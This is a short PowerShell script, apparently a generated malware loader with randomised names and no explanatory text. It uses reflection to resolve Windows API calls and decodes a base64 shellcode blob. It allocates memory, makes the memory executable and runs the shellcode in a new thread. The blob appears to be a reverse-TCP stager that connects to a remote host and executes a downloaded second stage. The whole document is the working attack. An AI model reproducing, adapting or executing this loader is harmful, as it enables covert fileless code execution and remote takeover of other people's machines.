function k6KYz {
        Param ($y2KET, $fU1EH)
        $rXL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $rXL.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($rXL.GetMethod('GetModuleHandle')).Invoke($null, @($y2KET)))), $fU1EH))
}

function ot {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $ep9,
                [Parameter(Position = 1)] [Type] $xbx = [Void]
        )

        $ndU = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ndU.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ep9).SetImplementationFlags('Runtime, Managed')
        $ndU.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $xbx, $ep9).SetImplementationFlags('Runtime, Managed')

        return $ndU.CreateType()
}

[Byte[]]$aqPcZ = [System.Convert]::FromBase64String("/OiPAAAAYInlMdJki1Iwi1IMi1IUMf+LcigPt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQi0I8VwHQi0B4hcB0TAHQi1ggAdNQi0gYhcl0PEkx/4s0iwHWMcCswc8NAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoAw62y2gCADCBieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VagBqBFZXaALZyF//1Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1QHDKcZ17sM=")
[Uint32]$exA = 0
$qp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((k6KYz kernel32.dll VirtualAlloc), (ot @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $aqPcZ.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($aqPcZ, 0, $qp, $aqPcZ.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((k6KYz kernel32.dll VirtualProtect), (ot @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($qp, [Uint32]$aqPcZ.Length, 0x10, [Ref]$exA)) -eq $true) {
        $liv = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((k6KYz kernel32.dll CreateThread), (ot @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$qp,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((k6KYz kernel32.dll WaitForSingleObject), (ot @([IntPtr], [Int32]))).Invoke($liv,0xffffffff) | Out-Null
}
